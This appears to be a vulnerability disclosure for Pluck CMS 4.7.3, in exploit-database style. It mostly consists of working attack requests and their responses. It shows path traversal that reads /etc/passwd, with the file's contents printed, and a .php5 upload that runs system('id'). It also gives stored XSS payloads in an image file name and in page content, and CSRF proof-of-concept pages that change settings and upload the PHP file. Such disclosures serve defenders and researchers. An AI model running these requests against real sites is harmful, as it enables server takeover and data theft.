@@ -1,0 +1,384 @@
+# Title: Pluck 4.7.3 - Multiple vulnerabilities
+# Date: 28.08.15
+# Vendor: pluck-cms.org
+# Affected versions: => 4.7.3 (current)
+# Tested on: Apache2.2 / PHP5 / Deb32
+# Author: Smash_ | smaash.net
+# Contact: smash [at] devilteam.pl
+
+Few vulnerabilities.
+
+Bugs:
+ - local file inclusion
+ - code execution
+ - stored xss
+ - csrf
+
+
+1/ LFI
+
+File inclusion vulnerability in pluck/admin.php in the in 'action' function allows  to include local files or potentially execute arbitrary PHP code.
+
+#1 - Request (count = en.php by default):
+POST /pluck/admin.php?action=language HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/admin.php?action=language
+Cookie: PHPSESSID=pb60nm4nq5a14spmt1aimdl525
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+
+cont1=../../../../../../../etc/passwd&save=Save
+
+
+#1 - Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 21:01:47 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 7374
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+(...)
+<div id="content">
+	<h2>language settings</h2>
+<div class="success">The language settings have been saved.</div>
+(...)
+
+#2 - Request:
+POST /pluck/admin.php?action=language HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/admin.php?action=language
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+cont1=../../../../../../etc/passwd%00&save=Save
+
+#2 - Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 20:30:11 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Set-Cookie: PHPSESSID=63erncd2l94qcah8g13bfvcga6; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 4503
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+mysql:x:101:103:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+colord:x:103:107:colord colour management daemon,,,:/var/lib/colord:/bin/false
+usbmux:x:104:46:usbmux daemon,,,:/home/usbmux:/bin/false
+miredo:x:105:65534::/var/run/miredo:/bin/false
+ntp:x:106:113::/home/ntp:/bin/false
+Debian-exim:x:107:114::/var/spool/exim4:/bin/false
+arpwatch:x:108:117:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
+avahi:x:109:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+beef-xss:x:110:119::/var/lib/beef-xss:/bin/false
+dradis:x:111:121::/var/lib/dradis:/bin/false
+pulse:x:112:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+speech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+haldaemon:x:114:124:Hardware abstraction layer,,,:/var/run/hald:/bin/false
+iodine:x:115:65534::/var/run/iodine:/bin/false
+postgres:x:116:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
+redsocks:x:118:128::/var/run/redsocks:/bin/false
+snmp:x:119:129::/var/lib/snmp:/bin/false
+stunnel4:x:120:130::/var/run/stunnel4:/bin/false
+statd:x:121:65534::/var/lib/nfs:/bin/false
+sslh:x:122:133::/nonexistent:/bin/false
+Debian-gdm:x:123:134:Gnome Display Manager:/var/lib/gdm3:/bin/false
+rtkit:x:124:136:RealtimeKit,,,:/proc:/bin/false
+saned:x:125:137::/home/saned:/bin/false
+devil:x:1000:1001:devil,,,:/home/devil:/bin/bash
+debian-tor:x:126:138::/var/lib/tor:/bin/false
+privoxy:x:127:65534::/etc/privoxy:/bin/false
+redis:x:128:139:redis server,,,:/var/lib/redis:/bin/false
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="../../../../../../etc/passwd" lang="../../../../../../etc/passwd">
+<head>
+(...)
+
+
+
+2/ Code Execution
+
+By default .php extenions shall be amended to .txt, but it is able to upload code simply by using other extension like php5.
+
+#1 - Request:
+POST /pluck/admin.php?action=files HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/admin.php?action=files
+Cookie: PHPSESSID=pb60nm4nq5a14spmt1aimdl525
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------155797884312716218971623852778
+Content-Length: 376
+
+-----------------------------155797884312716218971623852778
+Content-Disposition: form-data; name="filefile"; filename="phpinfo.php5"
+Content-Type: application/x-php
+
+<?php
+system('id');
+?>
+
+-----------------------------155797884312716218971623852778
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------155797884312716218971623852778--
+
+
+#1 - Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 20:41:43 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 9947
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+(...)
+
+
+#2 - Request:
+GET /pluck/files/phpinfo.php5 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/admin.php?action=files
+Cookie: PHPSESSID=pb60nm4nq5a14spmt1aimdl525
+Connection: keep-alive
+
+#2 - Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 20:41:44 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Vary: Accept-Encoding
+Content-Length: 54
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+
+3/ STORED XSS
+
+ a) image upload
+ 
+XSS is possible via file name.
+
+Request:
+POST /pluck/admin.php?action=images HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/admin.php?action=images
+Cookie: PHPSESSID=pb60nm4nq5a14spmt1aimdl525
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------3184135121063067737320373181
+Content-Length: 5013
+
+-----------------------------3184135121063067737320373181
+Content-Disposition: form-data; name="imagefile"; filename="<img src=# onerror=alert(1337)>.png"
+Content-Type: image/png
+
+(...)
+
+-----------------------------3184135121063067737320373181
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------3184135121063067737320373181--
+
+Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 20:43:19 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 9125
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+(...)
+				<div class="menudiv">
+					<strong>Name:</strong> <img src=# onerror=alert(1337)>.png					<br />
+					<strong>Size:</strong> 4653 bytes					<br />
+					<strong>Type:</strong> image/png					<br />
+					<strong>Upload successful!</strong>
+				</div>
+(...)
+
+
+ b) page
+ 
+XSS is possible when changing request, value of POST 'content' will be encoded by default.
+
+#1 - Request:
+POST /pluck/admin.php?action=editpage HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/admin.php?action=editpage
+Cookie: PHPSESSID=pb60nm4nq5a14spmt1aimdl525
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 127
+
+title=hello12&seo_name=&content=<script>alert(1337)</script>&description=&keywords=&hidden=no&sub_page=&theme=default&save=Save
+
+#1 - Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 21:11:43 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 7337
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+#2 - Request:
+GET /pluck/?file=hello12 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pluck/?file=hello
+Cookie: PHPSESSID=pb60nm4nq5a14spmt1aimdl525
+Connection: keep-alive
+
+#2 - Response:
+HTTP/1.1 200 OK
+Date: Fri, 28 Aug 2015 21:11:51 GMT
+Server: Apache/2.2.22 (Debian)
+X-Powered-By: PHP/5.4.41-0+deb7u1
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1289
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+(...)
+		<div class="submenu">
+						</div>
+		<div class="kop">hello12</div>
+		<div class="txt">
+			<script>alert(1337)</script>					</div>
+		<div style="clear: both;"> </div>
+		<div class="footer">
+(...)
+
+
+
+
+4/ CSRF
+
+Since there is no protection at all, it is able to trigger many actions via cross site request forgery.
+
+<html>
+  <!-- Change site settings -->
+  <body>
+    <form action="http://localhost/pluck/admin.php?action=settings" method="POST">
+      <input type="hidden" name="cont1" value="pwn" />
+      <input type="hidden" name="cont2" value="usr&#64;mail&#46;box" />
+      <input type="hidden" name="save" value="Save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+<html>
+  <!-- File upload -->
+  <body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/pluck/admin.php?action=files", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------155797884312716218971623852778");
+        xhr.withCredentials = true;
+        var body = "-----------------------------155797884312716218971623852778\r\n" + 
+          "Content-Disposition: form-data; name=\"filefile\"; filename=\"phpinfo.php5\"\r\n" + 
+          "Content-Type: application/x-php\r\n" + 
+          "\r\n" + 
+          "\x3c?php\r\n" + 
+          "system(\'id\');\r\n" + 
+          "?\x3e\r\n" + 
+          "\r\n" + 
+          "-----------------------------155797884312716218971623852778\r\n" + 
+          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
+          "\r\n" + 
+          "Upload\r\n" + 
+          "-----------------------------155797884312716218971623852778--";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+  </body>
+</html>
